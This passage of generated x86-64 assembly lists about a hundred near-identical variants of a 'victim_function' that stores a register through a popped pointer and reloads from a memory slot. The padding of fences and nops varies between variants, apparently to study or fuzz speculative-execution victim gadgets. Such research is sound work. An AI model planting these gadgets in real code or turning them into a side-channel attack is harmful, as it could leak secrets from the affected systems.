	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2090
.Lvictim_function_win0_var2090:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2091
.Lvictim_function_win0_var2091:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2092
.Lvictim_function_win0_var2092:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2093
.Lvictim_function_win0_var2093:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2094
.Lvictim_function_win0_var2094:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2095
.Lvictim_function_win0_var2095:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2096
.Lvictim_function_win0_var2096:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2097
.Lvictim_function_win0_var2097:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2098
.Lvictim_function_win0_var2098:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2099
.Lvictim_function_win0_var2099:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2100
.Lvictim_function_win0_var2100:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2101
.Lvictim_function_win0_var2101:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2102
.Lvictim_function_win0_var2102:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2103
.Lvictim_function_win0_var2103:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2104
.Lvictim_function_win0_var2104:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2105
.Lvictim_function_win0_var2105:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2106
.Lvictim_function_win0_var2106:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2107
.Lvictim_function_win0_var2107:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2108
.Lvictim_function_win0_var2108:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2109
.Lvictim_function_win0_var2109:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2110
.Lvictim_function_win0_var2110:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2111
.Lvictim_function_win0_var2111:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2112
.Lvictim_function_win0_var2112:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2113
.Lvictim_function_win0_var2113:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2114
.Lvictim_function_win0_var2114:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2115
.Lvictim_function_win0_var2115:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2116
.Lvictim_function_win0_var2116:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2117
.Lvictim_function_win0_var2117:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2118
.Lvictim_function_win0_var2118:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2119
.Lvictim_function_win0_var2119:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2120
.Lvictim_function_win0_var2120:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2121
.Lvictim_function_win0_var2121:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2122
.Lvictim_function_win0_var2122:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2123
.Lvictim_function_win0_var2123:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2124
.Lvictim_function_win0_var2124:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2125
.Lvictim_function_win0_var2125:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2126
.Lvictim_function_win0_var2126:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2127
.Lvictim_function_win0_var2127:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2128
.Lvictim_function_win0_var2128:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2129
.Lvictim_function_win0_var2129:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2130
.Lvictim_function_win0_var2130:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2131
.Lvictim_function_win0_var2131:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2132
.Lvictim_function_win0_var2132:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2133
.Lvictim_function_win0_var2133:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2134
.Lvictim_function_win0_var2134:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2135
.Lvictim_function_win0_var2135:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2136
.Lvictim_function_win0_var2136:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2137
.Lvictim_function_win0_var2137:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2138
.Lvictim_function_win0_var2138:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2139
.Lvictim_function_win0_var2139:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2140
.Lvictim_function_win0_var2140:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2141
.Lvictim_function_win0_var2141:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2142
.Lvictim_function_win0_var2142:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2143
.Lvictim_function_win0_var2143:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2144
.Lvictim_function_win0_var2144:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2145
.Lvictim_function_win0_var2145:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2146
.Lvictim_function_win0_var2146:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2147
.Lvictim_function_win0_var2147:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2148
.Lvictim_function_win0_var2148:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2149
.Lvictim_function_win0_var2149:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2150
.Lvictim_function_win0_var2150:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2151
.Lvictim_function_win0_var2151:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2152
.Lvictim_function_win0_var2152:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2153
.Lvictim_function_win0_var2153:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2154
.Lvictim_function_win0_var2154:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2155
.Lvictim_function_win0_var2155:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2156
.Lvictim_function_win0_var2156:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2157
.Lvictim_function_win0_var2157:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2158
.Lvictim_function_win0_var2158:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2159
.Lvictim_function_win0_var2159:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2160
.Lvictim_function_win0_var2160:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2161
.Lvictim_function_win0_var2161:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2162
.Lvictim_function_win0_var2162:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2163
.Lvictim_function_win0_var2163:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2164
.Lvictim_function_win0_var2164:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2165
.Lvictim_function_win0_var2165:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2166
.Lvictim_function_win0_var2166:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2167
.Lvictim_function_win0_var2167:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2168
.Lvictim_function_win0_var2168:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2169
.Lvictim_function_win0_var2169:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2170
.Lvictim_function_win0_var2170:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2171
.Lvictim_function_win0_var2171:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2172
.Lvictim_function_win0_var2172:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2173
.Lvictim_function_win0_var2173:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2174
.Lvictim_function_win0_var2174:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2175
.Lvictim_function_win0_var2175:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2176
.Lvictim_function_win0_var2176:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2177
.Lvictim_function_win0_var2177:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2178
.Lvictim_function_win0_var2178:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2179
.Lvictim_function_win0_var2179:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2180
.Lvictim_function_win0_var2180:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2181
.Lvictim_function_win0_var2181:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2182
.Lvictim_function_win0_var2182:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2183
.Lvictim_function_win0_var2183:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2184
.Lvictim_function_win0_var2184:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2185
.Lvictim_function_win0_var2185:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2186
.Lvictim_function_win0_var2186:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 2187
.Lvictim_function_win0_var2187:
